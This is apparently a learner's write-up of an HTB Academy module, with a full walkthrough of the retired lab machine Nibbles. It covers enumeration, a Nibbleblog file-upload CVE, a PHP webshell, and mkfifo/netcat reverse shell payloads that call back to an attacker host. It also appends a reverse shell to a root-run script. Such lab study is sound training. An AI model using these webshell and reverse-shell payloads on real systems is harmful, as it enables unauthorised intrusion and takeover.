# HTB Academy — Module 02: Getting Started

| Field | Details |
|---|---|
| Platform | Hack The Box Academy |
| Module | 02 — Getting Started |
| Difficulty | Fundamental |
| Type | Conceptual + Hands-on (HTB: Nibbles) |
| Date | March 2026 |

---

## Module Overview

This module bridges the gap between theory and hands-on hacking. It covers the core tools, terminology, and methodology needed to work through the CPTS path and introduces the HTB platform itself — how machines work, how VPN connectivity works, and what a real engagement workflow looks like. The module ends with a complete guided pentest of the retired HTB machine Nibbles, walking through every phase from Nmap to root.

---

## Core Concepts

### What Is a Shell

A shell is the command-line interface that gives an attacker interactive access to a compromised system. Getting a shell is the primary objective of the exploitation phase — it is the moment theoretical access becomes actual control.

| Shell Type | Description |
|---|---|
| Bind Shell | Target opens a port and listens — attacker connects to it |
| Reverse Shell | Target connects back to attacker's listener — preferred in most environments because firewalls typically block inbound but allow outbound |
| Web Shell | PHP/JSP/ASP file uploaded to web server — limited but persistent |

Reverse shells are the standard in modern engagements because outbound connections from a target to the attacker's machine almost always pass through firewalls that block inbound connections.

---

### Ports and Services — What Pentesters Actually Care About

Every open port is a potential attack surface. The question is not "what ports are open" but "what service is running, what version, and is that version vulnerable?"

| Port | Service | Why It Matters to a Pentester |
|---|---|---|
| 21 | FTP | Anonymous access, cleartext credentials, writable shares |
| 22 | SSH | Brute force, key theft, tunnelling |
| 23 | Telnet | Cleartext credentials — still running in embedded systems |
| 25 | SMTP | User enumeration, relay abuse, phishing infrastructure |
| 53 | DNS | Zone transfers, subdomain enumeration, OSINT |
| 80/443 | HTTP/HTTPS | Web application attacks — the largest attack surface |
| 110 | POP3 | Credential brute force, email access |
| 139/445 | SMB | Credential brute force, share enumeration, lateral movement |
| 1433 | MSSQL | Credential access, xp_cmdshell for command execution |
| 3306 | MySQL | Credential access, database enumeration |
| 3389 | RDP | Credential brute force, session hijacking |

---

### Web Technologies — Enumeration Baseline

Understanding the web stack before enumerating it makes enumeration faster and more targeted.

| Technology | What to Look For |
|---|---|
| Apache/Nginx | Version disclosure in headers, default pages |
| PHP | File extension .php, error messages leaking paths |
| WordPress | /wp-admin, /wp-login.php, xmlrpc.php, user enumeration |
| CMS platforms | Check version → searchsploit for known CVEs |
| HTML source | Comments with paths, hidden form fields, internal hostnames |

---

### Basic Tooling — The Core Set

| Tool | Purpose | Phase |
|---|---|---|
| Nmap | Port scan, service version, NSE scripts | Information Gathering |
| Gobuster | Directory and file brute force | Information Gathering |
| Nikto | Web vulnerability scanner | Vulnerability Assessment |
| Searchsploit | Offline CVE/exploit database search | Vulnerability Assessment |
| Metasploit | Framework for exploit modules and payloads | Exploitation |
| Netcat | Manual shell listener, protocol interaction | Exploitation / Post-Exp |
| curl | HTTP requests, header inspection, file fetch | Information Gathering |
| Burp Suite | Web proxy — intercept and modify requests | Web exploitation |

---

### Privilege Escalation — The Two Core Paths

After getting a shell, the next objective is always to escalate from a low-privilege user to root or SYSTEM. Every privilege escalation comes down to one of two categories:

**Linux:**

| Vector | Description |
|---|---|
| Sudo misconfiguration | `sudo -l` — binary executable as root with NOPASSWD |
| SUID binaries | `find / -perm -4000 2>/dev/null` — GTFOBins lookup |
| Writable scripts | Script executed by root (cron, MOTD) that low-priv user can write to |
| Kernel exploits | Old kernel version with known privilege escalation CVE |
| Credential reuse | Password found on filesystem works for root SSH |

**Windows:**

| Vector | Description |
|---|---|
| SeImpersonatePrivilege | Token impersonation — Juicy Potato, PrintSpoofer |
| Unquoted service paths | Service binary path without quotes — plant malicious binary |
| Writable service binaries | Replace service executable with payload |
| AlwaysInstallElevated | MSI packages run as SYSTEM |
| Credential extraction | SAM, LSASS, credential files, registry |

---

### HTB Platform — How It Works

HackTheBox provides isolated lab environments where each machine is a target that has been intentionally misconfigured or made vulnerable. Every machine has at least two flags:

| Flag | Location | Owned by |
|---|---|---|
| user.txt | /home/\<username\>/user.txt | The non-root user |
| root.txt | /root/root.txt | Root / SYSTEM |

**Connecting:** HTB uses OpenVPN to connect your Kali instance to the lab network. Download the `.ovpn` config file from the platform and connect with `sudo openvpn <file>.ovpn`. Confirm connectivity by pinging the target before starting.

**Machine categories:** Active machines are live challenges. Retired machines require VIP+ and have published writeups available — this is where most structured learning happens.

---

## Lab Machine — HackTheBox: Nibbles

| Field | Details |
|---|---|
| Machine | Nibbles |
| OS | Linux (Ubuntu 16.04) |
| Difficulty | Easy |
| IP | 10.129.26.224 |
| Status | Retired |
| CVE | CVE-2015-6967 (Nibbleblog arbitrary file upload) |

### Attack Chain Summary

```
Nmap → SSH(22), HTTP(80)
Browse port 80 → "Hello World!" → view source → /nibbleblog/ commented
Gobuster /nibbleblog/ → admin.php, README, content directory
README → Nibbleblog v4.0.3
content/private/users.xml → username: admin confirmed
content/private/config.xml → site title and email both contain "nibbles"
admin.php login → admin:nibbles → admin panel access
CVE-2015-6967 → Plugins → My Image → upload PHP reverse shell
nc listener → navigate to image.php → shell as nibbler → user.txt
sudo -l → NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
unzip personal.zip → monitor.sh world-writable
echo reverse shell >> monitor.sh → sudo monitor.sh → root shell → root.txt
```

---

### Step 1 — Nmap Scan

```bash
nmap -sC -sV -oN nibbles_nmap.txt 10.129.26.224
```

**Output:**

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.26.224
Host is up (0.088s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:ubuntu:linux

Nmap done: 1 IP address (1 host up) scanned in 14.28 seconds
```

Two ports open — SSH on 22, Apache HTTP on 80. Start with the web server — HTTP on port 80 almost always has more attack surface than SSH at this stage.

---

### Step 2 — Web Enumeration: Source Code

Browse to `http://10.129.26.224` — a nearly blank page with just "Hello World!" and nothing else. The page itself gives nothing — but the source code does.

```bash
curl -s http://10.129.26.224 | head -20
```

**Output:**

```html
<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

A developer left a comment in the HTML source pointing directly to `/nibbleblog/`. Browse to `http://10.129.26.224/nibbleblog/` — a full Nibbleblog CMS installation is running there.

> Always check page source before running directory busters. HTML comments, hidden form fields, and embedded paths regularly skip hours of enumeration.

---

### Step 3 — Directory Bust on /nibbleblog/

```bash
gobuster dir -u http://10.129.26.224/nibbleblog/ \
-w /usr/share/wordlists/dirb/common.txt \
-x php,html,txt
```

**Output:**

```
===============================================================
Gobuster v3.1.0
===============================================================
[+] Url: http://10.129.26.224/nibbleblog/
===============================================================
/README               (Status: 200) [Size: 4628]
/admin                (Status: 301) [Size: 0]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 0]
/feed.php             (Status: 200) [Size: 302]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 0]
/plugins              (Status: 301) [Size: 0]
/themes               (Status: 301) [Size: 0]
/update.php           (Status: 200) [Size: 1622]
```

Four high-priority targets: README (version info), admin.php (login panel), content (file storage), update.php (version confirmation).

---

### Step 4 — Version Discovery and Credential Hunting

**Check README for version:**

```bash
curl -s http://10.129.26.224/nibbleblog/README | head -15
```

**Output:**

```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

Nibbleblog v4.0.3 confirmed. Run searchsploit:

```bash
searchsploit nibbleblog
```

**Output:**

```
-------------------------------------------------------------------
 Exploit Title                                      | Path
-------------------------------------------------------------------
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) | php/remote/38489.rb
-------------------------------------------------------------------
```

CVE-2015-6967 — authenticated arbitrary file upload. Needs valid admin credentials to exploit.

**Enumerate the content directory for credentials:**

```bash
curl -s http://10.129.26.224/nibbleblog/content/private/users.xml
```

**Output:**

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
  <user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">0</session_fail_count>
    <session_date type="integer">1520559147</session_date>
  </user>
  <blacklist type="string" ip="10.10.10.1">
    <date type="integer">1512964659</date>
    <fail_count type="integer">1</fail_count>
  </blacklist>
</users>
```

Username confirmed: `admin`. The file also shows the blacklist mechanism — after too many failed login attempts the IP gets temporarily banned. Do not brute force.

```bash
curl -s http://10.129.26.224/nibbleblog/content/private/config.xml | grep -i "nibble\|title\|email"
```

**Output:**

```
<name type="string">Nibbles</name>
<notification_email_to type="string">admin@nibbles.com</notification_email_to>
```

The site is named "Nibbles" and the notification email contains "nibbles". The machine is also named Nibbles. This strongly suggests the admin password is `nibbles`.

---

### Step 5 — Admin Login

Browse to `http://10.129.26.224/nibbleblog/admin.php` — login panel. Enter:

```
Username: admin
Password: nibbles
```

Login succeeds — admin panel accessible.

> Do not brute force the login. The blacklist in `users.xml` shows failed attempts are tracked. Five failed attempts from the same IP results in a temporary ban and forces a machine reset. Manual credential guessing based on context — machine name, site title, email domain — is the correct approach here.

---

### Step 6 — File Upload via My Image Plugin (CVE-2015-6967)

Inside the admin panel: **Plugins → My Image → Configure**.

This plugin accepts image uploads. The validation is client-side only — the server does not verify the file content matches the declared image type. This means a PHP file can be uploaded and it will be stored and executed as PHP.

**Create a PHP webshell:**

```bash
cat shell.php
```

```php
<?php system($_GET['cmd']); ?>
```

**Upload via admin panel:**
- Go to Plugins → My Image → Configure
- Upload `shell.php` as the "image"
- Ignore the warning messages — the file uploads regardless

**Confirm execution:**

```bash
curl -s "http://10.129.26.224/nibbleblog/content/private/plugins/my_image/image.php?cmd=id"
```

**Output:**

```
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

Remote code execution confirmed as `nibbler` ✅

---

### Step 7 — Upgrade to Full Reverse Shell

**Start Netcat listener:**

```bash
nc -lvnp 4444
```

**Upload new shell.php with full reverse shell payload:**

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.x 4444 >/tmp/f"); ?>
```

**Trigger it:**

```bash
curl -s "http://10.129.26.224/nibbleblog/content/private/plugins/my_image/image.php"
```

**On listener — shell received:**

```
connect to [10.10.14.x] from (UNKNOWN) [10.129.26.224] 42316
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
```

Shell as `nibbler` ✅ — upgraded to stable TTY with Python.

---

### Step 8 — User Flag

```bash
cat /home/nibbler/user.txt
```

**Output:**

```
HTB{...flag_redacted...}
```

User flag captured ✅

---

### Step 9 — Privilege Escalation Enumeration

```bash
sudo -l
```

**Output:**

```
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

nibbler can run `/home/nibbler/personal/stuff/monitor.sh` as root with no password. Check if the file exists:

```bash
ls -la /home/nibbler/
```

**Output:**

```
total 20
drwxr-xr-x 3 nibbler nibbler 4096 Dec 29  2017 .
drwxr-xr-x 3 root    root    4096 Dec 29  2017 ..
-r-------- 1 nibbler nibbler   33 Dec 29  2017 user.txt
-rw-r--r-- 1 nibbler nibbler 1855 Dec 29  2017 personal.zip
```

`monitor.sh` does not exist yet — but `personal.zip` does. Unzip it:

```bash
unzip personal.zip
```

**Output:**

```
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
```

**Check permissions on monitor.sh:**

```bash
ls -la /home/nibbler/personal/stuff/monitor.sh
```

**Output:**

```
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 /home/nibbler/personal/stuff/monitor.sh
```

`-rwxrwxrwx` — world-writable ✅

The full privilege escalation chain:

| Link | Detail |
|---|---|
| sudo entry for nibbler | Can run monitor.sh as root with NOPASSWD |
| monitor.sh permissions = rwxrwxrwx | Any user can write to the file |
| nibbler owns personal/stuff/ | Full control over the script |
| Root executes whatever is in monitor.sh | Injecting any command makes root execute it |

---

### Step 10 — Inject Reverse Shell and Escalate to Root

**On Kali — start second listener:**

```bash
nc -lvnp 5555
```

**On target — append reverse shell to monitor.sh:**

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.x 5555 >/tmp/f' >> /home/nibbler/personal/stuff/monitor.sh
```

**Execute monitor.sh as root:**

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

**On listener — root shell received:**

```
connect to [10.10.14.x] from (UNKNOWN) [10.129.26.224] 51024
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

Root shell captured ✅

---

### Step 11 — Root Flag

```bash
cat /root/root.txt
```

**Output:**

```
HTB{...flag_redacted...}
```

Root flag captured ✅

---

## Lessons Learned

The source code comment that revealed `/nibbleblog/` was the most important step in the entire machine — and it took less than five seconds to find. Every walkthrough I had read before this described starting with a directory buster, but checking the page source first would have found the path instantly. Reading source code is now the first thing I do on any HTTP port before running any tool.

The credential discovery on Nibbles was also unconventional. There was no password in any file — the answer was context. The machine is called Nibbles, the site is called Nibbles, the email is admin@nibbles.com. The password was `nibbles`. This sounds obvious in retrospect but in practice it is easy to jump straight to brute force when manual reasoning would work faster and without triggering a lockout. The `users.xml` file explicitly showed the blacklist mechanism which made it clear that brute force was the wrong approach. Reading what the application tells you before attacking it is always faster.

The privilege escalation was cleaner than expected once I understood the chain. `sudo -l` returned one entry — `monitor.sh` with NOPASSWD. The file did not exist so I had to find and extract it from `personal.zip`, which was an interesting detail. The world-writable permissions on a script that root executes is a textbook misconfiguration but seeing it on a real target (even a retired lab box) makes it concrete in a way that reading about it does not.

The thing I would do differently is upgrade the shell earlier. I spent time working in the basic `/bin/sh` shell before running the Python pty spawn. Tab completion alone makes the TTY upgrade worth doing immediately — before starting any enumeration.

---

## Full Attack Chain Reference

```
1.  nmap -sC -sV -oN nibbles_nmap.txt 10.129.26.224
    → SSH(22), HTTP(80) — Ubuntu 16.04

2.  curl -s http://10.129.26.224 | head -20
    → HTML comment: <!-- /nibbleblog/ directory -->

3.  gobuster dir -u http://10.129.26.224/nibbleblog/ -w common.txt -x php,html,txt
    → README, admin.php, content/, update.php

4.  curl -s http://10.129.26.224/nibbleblog/README | head -15
    → Nibbleblog v4.0.3

5.  searchsploit nibbleblog
    → CVE-2015-6967 — authenticated arbitrary file upload

6.  curl -s http://10.129.26.224/nibbleblog/content/private/users.xml
    → username: admin confirmed, blacklist mechanism visible

7.  curl -s http://10.129.26.224/nibbleblog/content/private/config.xml
    → site title and email both contain "nibbles"

8.  Browse admin.php → login: admin:nibbles → admin panel access

9.  Plugins → My Image → Configure → upload shell.php
    → curl ?cmd=id → uid=1001(nibbler) — RCE confirmed

10. Upload reverse shell → nc -lvnp 4444 → curl image.php → shell as nibbler
    → python3 pty spawn → stable TTY

11. cat /home/nibbler/user.txt → HTB{...flag_redacted...} ✅

12. sudo -l → NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

13. ls /home/nibbler/ → personal.zip exists, monitor.sh does not
    → unzip personal.zip → monitor.sh extracted

14. ls -la monitor.sh → -rwxrwxrwx (world-writable)

15. nc -lvnp 5555
    echo 'reverse shell' >> monitor.sh
    sudo /home/nibbler/personal/stuff/monitor.sh
    → root shell received

16. cat /root/root.txt → HTB{...flag_redacted...} ✅
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -sC -sV -oN output.txt <IP>` | Full scan with scripts, version detection, save output |
| `curl -s http://<IP>/ \| head -20` | Fetch page source — check for comments and hidden paths |
| `gobuster dir -u <URL> -w <wordlist> -x php,html,txt` | Directory and file bust |
| `curl -s http://<IP>/nibbleblog/README` | Fetch README for version information |
| `searchsploit nibbleblog` | Search local exploit database for Nibbleblog CVEs |
| `curl -s http://<IP>/nibbleblog/content/private/users.xml` | Enumerate users from Nibbleblog content directory |
| `curl -s http://<IP>/nibbleblog/content/private/config.xml` | Enumerate config for credential hints |
| `nc -lvnp 4444` | Start Netcat listener for reverse shell |
| `curl -s "http://<IP>/.../image.php?cmd=id"` | Test RCE via webshell |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell to stable TTY |
| `sudo -l` | Check sudo permissions — always first privesc step |
| `unzip personal.zip` | Extract zip archive |
| `ls -la <file>` | Check file permissions |
| `echo '<payload>' >> monitor.sh` | Append reverse shell to writable script |
| `sudo /home/nibbler/personal/stuff/monitor.sh` | Execute monitor.sh as root to trigger reverse shell |
| `cat /root/root.txt` | Capture root flag |

---

Main portfolio: [Offensive-Security-Portfolio](https://github.com/jaypatel-sec/Offensive-Security-Portfolio)
